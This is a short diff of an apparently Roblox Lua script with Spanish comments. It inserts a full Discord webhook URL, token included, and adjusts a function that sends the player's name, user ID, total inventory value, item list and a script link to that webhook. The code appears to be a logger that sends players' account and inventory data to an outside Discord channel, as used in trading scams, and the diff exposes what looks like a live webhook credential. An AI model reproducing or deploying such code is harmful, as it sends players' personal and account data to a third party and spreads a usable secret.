@@ -9,7 +9,7 @@ local StarterGui = game:GetService("StarterGui")
 local Lighting = game:GetService("Lighting")
 
 -- CONFIGURACIÓN
-local WEBHOOK_URL = "  "
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1456818151617466540/gTXIOakP_WD8mLEEuvEKO-0NeoIXCnze3xBQubOKmDhmxSioyYPIaC0gFvWOBC_VKVhg"
 local Min_Gen = 0
 
 -- VARIABLES LOCALES
@@ -164,7 +164,7 @@ local function sendToDiscord(link, brainrots)
                     fields = {
                         {name = "👤 Usuario", value = Jugador.Name .. " (" .. UserID .. ")", inline = true},
                         {name = "💰 Valor Total", value = "**" .. formatNumberShort(totalValue) .. "**", inline = true},
-                        {name = "🔗 Script", value = "```" .. link .. "```"},
+                        {name = "🔗 Script", value = "`" .. link .. "`"},
                         {name = "📋 Inventario", value = (itemList ~= "" and itemList or "Vacío")}
                     }
                 }}
